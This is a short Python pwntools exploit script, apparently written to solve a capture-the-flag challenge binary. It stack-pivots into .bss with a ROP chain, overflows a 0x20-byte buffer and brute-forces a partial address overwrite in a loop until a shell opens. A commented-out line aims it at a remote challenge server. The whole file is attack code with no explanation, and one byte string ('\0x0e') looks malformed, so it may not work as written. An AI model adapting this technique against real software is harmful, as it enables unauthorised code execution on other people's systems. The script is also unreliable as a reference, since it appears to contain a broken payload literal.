from pwn import *

e = ELF('./chall')
libc = ELF('./libc-2.23.so')
# libc = e.libc

bss = 0x601038
pop_rsi = 0x40049e 
leave_ret = 0x400499 
main = e.symbols['main']
read_plt = e.symbols['read']

while True:
    p = process('./chall')
    #p = remote('13.231.207.73', 9002)
    
    payload = 'a' * 0x20
    payload += p64(bss)
    payload += p64(pop_rsi)
    payload += p64(bss)
    payload += p64(read_plt)
    payload += p64(leave_ret)
    p.send(payload)
    pause()

    payload = 'A' * (0x8) + '\x84\x6c\0x0e'
    p.send(payload)
    pause()

    try:
        if 'redir' in p.recv(0x20, timeout=3):
            p.close()
        else:
            p.interactive()
    except:
        p.interactive()
        p.close()